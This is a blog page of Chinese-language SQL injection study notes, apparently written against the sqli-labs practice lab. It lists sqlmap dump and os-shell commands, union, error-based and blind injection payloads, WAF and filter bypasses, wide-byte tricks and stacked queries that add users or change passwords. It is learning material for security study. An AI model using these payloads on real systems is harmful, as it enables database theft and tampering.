@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SQL injection | zjzh's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);document.addEventListener('pjax:success', _ => bszCaller.fetch(
+ "//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback", a => {
+  bszTag.texts(a),
+  bszTag.shows()
+}));reset()})</script><meta name="generator" content="Hexo 6.2.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>SQL injection</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-02-14T07:52:26.000Z" id="date"> 2024-02-14</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-02-14T10:54:08.173Z" id="updated"> 2024-02-14</time></div></span><br><span id="busuanzi_container_page_pv">Page View: <span class="control" id="busuanzi_value_page_pv">loading...</span></span></div></div><hr><div id="post-content"><p>[TOC]</p>
+<p>闭合类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">数字型<br>&#x27;<br>&quot;<br>&#x27;)<br>&quot;)<br>&#x27;))<br><br></code></pre></td></tr></table></figure>
+
+<p>在user-agent、referer、cookie、</p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>使用sqlmap时需要授权，不授权不可用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python sqlmap.py http://127.0.0.1/sqli-labs/Less-5/?id=-1  ---输出漏洞和数据信息<br><br>扫描数据库<br>python sqlmap.py -u http://example.com/index.php?id=1 --dbs<br>这将尝试查找任何可用的数据库，如果找到任何数据库，则会显示出来。<br><br>扫描表<br>python sqlmap.py -u http://example.com/index.php?id=1 -D database_name --tables<br>其中 database_name 是上一步中找到的数据库名称。这将尝试查找数据库中的任何表并列出它们的名称。<br><br>扫描列<br>python sqlmap.py -u http://example.com/index.php?id=1 -D database_name -T table_name --columns<br>其中 database_name 是数据库名称，table_name 是要扫描的表名。这将尝试找到表中的任何列并列出它们的名称。<br><br>抓包修改可用sqlmap<br>启动sqlmap探测注入点<br>sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch<br>爆破当前数据库名<br>sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch --current-db<br>爆破数据表<br>sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch -D security --tables<br>最后脱库<br>sqlmap.py -u ip --data=&quot;uname=admin&amp;passwd=admin&quot; --batch -D security -T users -<br>-dump<br>也可以将抓包内容保存，之后<br>sqlmap.py -r txt文件位置 -p 要扫描的点<br>爆破数据库<br>sqlmap.py -r .txt文件位置 -p 扫描的位置 --current-db<br>爆破表<br>sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --tables<br>脱库<br>sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --dump<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在头部注入爆破中，sqlmap需要提高扫描等级 level和risk，或将数据包保存，在需要检测的地方打上*，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">level x(x为1-5) 当为2时会对头部的cookie进行扫描注入尝试，x&gt;=3时队user-Agent,ip,referer<br>参数进行扫描<br>risk x(x 1-3) 1时进行大部分扫描 2会增加基于事件的测试语句 3会增加or语句的sql注入<br></code></pre></td></tr></table></figure>
+
+<p>![image-20240207212939979](sql inj&#x2F;image-20240207212939979.png)</p>
+<p>![image-20240207213045292](sql inj&#x2F;image-20240207213045292.png)</p>
+<p>sqlmap加密注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">扫描<br>sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot;<br>爆破数据库<br>sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; --current-db<br>爆破表单<br>sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security -<br>-tables<br>脱库<br>sqlmap.py -r ./xx.txt --batch --level 3 --tamper=&quot;base64encode.py&quot; -D security -<br>T users --dump<br></code></pre></td></tr></table></figure>
+
+
+
+<p>sqlmap宽字节注入运用</p>
+<p>宽字节注入需要使用模块tamper中的“unmagicquotes.py“</p>
+<p>get型常用参数 </p>
+<p>-u：指定注入的URL   sqlmap -u URL<br>–dbs：爆出所有数据库 sqlmap -u URL –dbs<br>–dbms：指定数据库类型 sqlmap -u URL –dbms&#x3D;mysql<br>–users：查看数据库的所有用户 sqlmap -u URL –users<br>–current-user：查看数据库当前用户 sqlmap -u URL –current-user<br>–current-db：查看网站当前数据库 sqlmap -u URL –current-db<br>–is-dba：判断当前用户是否有管理员权限 sqlmap -u URL –is-dba<br>      [11:57:52] [INFO] testing if current user is DBA<br>    [11:57:52] [INFO] fetching current user<br>    current user is DBA: True<br>–roles：列出数据库所有管理员角色，仅适用于oracle数据库 sqlmap -u URL –roles<br>–tables：爆出所有数据表 sqlmap -u URL -D 数据库名 –tables<br>–columns：爆出数据库表所有列 sqlmap -u URL -D 数据库名 -T 表名 –columns<br>–dump：爆出数据库中列中的所有数据 sqlmap -u URL -D 数据库名 -T 表名 -C 列名 –dump<br>–dump-all：爆出数据库中所有的数据 sqlmap -u URL -D 数据库名 -T 表名 –dump-all<br>–sql-shell：获取数据库shell  sqlmap -u URL –sql-shell<br>–os-shell：获取服务器shell  sqlmap -u URL –os-shell<br>–file-read：读取服务器文件  sqlmap -u URL –file-read “文件路径及名称”<br>–file-write 本地文件 –file-dist 目标文件路径及名称：将本地文件上传至目标服务器<br>–time-sec&#x3D;2：延时注入 sqlmap -u URL –time-sec&#x3D;2<br>–batch：探测过程中不进行询问，一律选择默认<br>-m：如果有多个url地址，可以把多个url保存成一个文本文件，-m可以加载文本文件逐个扫描</p>
+<p>post型常用参数 </p>
+<p>-r：指定POST数据文件  sqlmap -r post.txt<br>–data：这种不需要将数据进行保存，只需要将post数据复制下来即可 sqlmap -u URL –data&#x3D;”post数据”<br>–forms：自动搜索表单的方式 sqlmap -u URL –forms<br>–cookie&#x3D;”抓取的cookie”：测试cookie字段<br>–param-del：参数拆分字符，当GET型或POST型需要用其他字符分割测试参数的时候需要用到此参数，sqlmap -r post.txt –data&#x3D;”query&#x3D;foorbar;id&#x3D;1” –param-del<br>–referer：在请求中伪造http中的referer，当level参数设定为3或者3以上的时候会尝试对referer注入<br>–headers：增加额外的http头<br>–proxy：指定代理地址<br>-p：指定测试参数</p>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>求列数，以便后续求显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1 and 0 order by 3;<br></code></pre></td></tr></table></figure>
+
+<p>找显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) and 0 union select 1,2,3--+<br></code></pre></td></tr></table></figure>
+
+<p>查库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) and 0 union select 1,database(),3--+<br></code></pre></td></tr></table></figure>
+
+<p>查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) and 0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()<br></code></pre></td></tr></table></figure>
+
+<p>查列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) and 0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; and table_schema=database()<br></code></pre></td></tr></table></figure>
+
+<p>查值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;) and 0 union select 1,group_concat(id,0x7e,password,0x7e,username),3 from users<br></code></pre></td></tr></table></figure>
+
+<p>有数据库的报错，</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><p>updatexml报错表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>updatexml报错列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 2,1)),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>updatexml报错值（依次查询报错）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>报错密码或者数据过长时，用substring（）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">updatexml(1,concat(0x7e,substring((select password from users limit 0,1), 32)),0)--+<br></code></pre></td></tr></table></figure>
+
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><p>extractvalue报错库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and extractvalue(1,concat(0x7e,database()))--+<br></code></pre></td></tr></table></figure>
+
+<p>extractvalue报错表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+<br></code></pre></td></tr></table></figure>
+
+<p>extractvalue报错列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+<br></code></pre></td></tr></table></figure>
+
+<p>extractvalue报错值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27; and extractvalue(1,(select group_concat(0x7e,id,0x7e,username,0x7e,password) from users))--+<br></code></pre></td></tr></table></figure>
+
+<p>group_concat放不下时，可采用limit 截断分开查询</p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><p>前提：知道有多少字段数</p>
+<p>爆破库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat(0x7e(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+<br></code></pre></td></tr></table></figure>
+
+<p>爆破表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (table_name)from<br>information_schema.tables where table_schema=database() limit<br>0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+<br></code></pre></td></tr></table></figure>
+
+<p>爆破字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (column_name)from<br>information_schema.columns where table_name=&#x27;users&#x27; limit<br>0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+<br></code></pre></td></tr></table></figure>
+
+<p>爆破内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select 1,count(*),concat(0x7e,(select (username)from users limit<br>0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">猜解数据库名字长度<br>?id=-1&#x27; or length(database())=7--+<br><br>猜解数据库字符<br>?id=-1&#x27; or ascii(substr(database(),1,1))=115或<br>?id=-1&#x27; or ascii(mid(database(),1,1))=115--+或<br>?id=-1&#x27; or mid(database(),1,1)=&#x27;s&#x27;--+<br><br>同样猜表名与字段名<br>?id=-1&#x27; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+<br></code></pre></td></tr></table></figure>
+
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure>
+
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; or if(length(database())=8,sleep(5),0)--+<br></code></pre></td></tr></table></figure>
+
+<p>响应时间变长说明条件正确</p>
+<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><p>and or 过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">重写<br><br>oorr 或|| <br>anandd 或&amp;&amp;<br></code></pre></td></tr></table></figure>
+
+<p>空格注释过滤了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and和or用&amp;&amp; ||代替，&amp;&amp;时需要编码一下<br># --  闭合逃逸<br>/s   ==括号<br>空格 ---&gt; %0a<br><br></code></pre></td></tr></table></figure>
+
+<p>或者盲注</p>
+<p>使用十六进制</p>
+<h1 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h1><p>服务器端有两个部分：第一部分是tomcat为引擎的jsp型服务器，第二部分是apache为引擎的php服务</p>
+<p>器，真正提供web服务的是php服务器，往往在tomcat的服务器处做过滤处理，功能类似于waf，由于</p>
+<p>解析参数的机制不同，我们可以利用该原理绕过waf的检测；数据解析的顺序：tomcat从前往后，</p>
+<p>appache从后往前</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&amp;id=0&#x27; union select 1,2,(select group_concat(column_name)from<br>information_schema.columns where table_schema=database() and<br>table_name=&#x27;users&#x27;)--+<br><br>?id=1&amp;id=0&#x27; union select 1,2,(select concat_ws(username,0x7e,password)from<br>security.users limit 0,1)--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="有转义"><a href="#有转义" class="headerlink" title="有转义"></a>有转义</h1><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p>宽字节注入，利用mysql使用GBK编码，将两个字符看作一个汉字的特性，消除转义符号””，使单引号</p>
+<p>成功逃逸出来。这也是黑盒测试需要检测的一个点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">get型宽字节检验payload<br>?id=1%df&#x27; and 1=1--+<br><br>判断字段数<br>?id=1%df&#x27; and 1=1 order by 4--+<br>找回显，信息收集<br>?id=1%df&#x27; and 1=2 union select 1,database(),3--+<br>爆破数据库表<br>?id=1%df&#x27; and 1=2 union select 1,2,group_concat(table_name)from<br>information_schema.tables where table_schema=database()--+<br>爆破字段内容：因为&#x27;users&#x27;中单引号会被转义，因此采取十六进制代替&#x27;users&#x27;<br>?id=1%df&#x27; and 1=2 union select 1,2,group_concat(column_name)from<br>information_schema.columns where table_name=0x27757365727327--+<br></code></pre></td></tr></table></figure>
+
+<h2 id="post提交"><a href="#post提交" class="headerlink" title="post提交"></a>post提交</h2><p>不能使用url编码，但是可以使用十六进制编码绕过，但是需要使用三个字节，最好的</p>
+<p>办法是是使用汉字(一些汉字是三个字节的就可以将后面的\消耗)</p>
+<p>post中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">uname=汉&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)--<br>+&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>mysqli_multi_query()这个函数可以实现针对数据库一条或多多条数据的操作，这就导致可能产生堆叠</p>
+<p>注入的存在，堆叠注入的危害比普通爆破更为强烈,可以实现数据的增删改查，木马的写入，甚至直接破</p>
+<p>环升格数据库</p>
+<p>例如插入一条数据在users字段中,两条不同sql语句用分号隔开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1&#x27;;insert into users(username,password)values(&#x27;ikun&#x27;,&#x27;jinitaimei&#x27;)--+<br><br>?id=-1&#x27; union select 1,2,(select group_concat(username,0x7e,password)from<br>users)--+<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">堆叠注入修改Dumb账户的密码<br>?id=1&#x27;);update security.users set password=&#x27;IKUN&#x27; where username=&#x27;Dumb&#x27;--+<br></code></pre></td></tr></table></figure>
+
+<h1 id="匹配所有字段"><a href="#匹配所有字段" class="headerlink" title="%匹配所有字段"></a>%匹配所有字段</h1><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/14/xss/">XSS Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">John Doe</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml"><span class="toc-number">3.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue"><span class="toc-number">3.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#floor"><span class="toc-number">3.3.</span> <span class="toc-text">floor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">过滤绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text">HTTP参数污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E8%BD%AC%E4%B9%89"><span class="toc-number">8.</span> <span class="toc-text">有转义</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82"><span class="toc-number">8.1.</span> <span class="toc-text">宽字节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#post%E6%8F%90%E4%BA%A4"><span class="toc-number">8.2.</span> <span class="toc-text">post提交</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%B9%E9%85%8D%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5"><span class="toc-number">10.</span> <span class="toc-text">%匹配所有字段</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
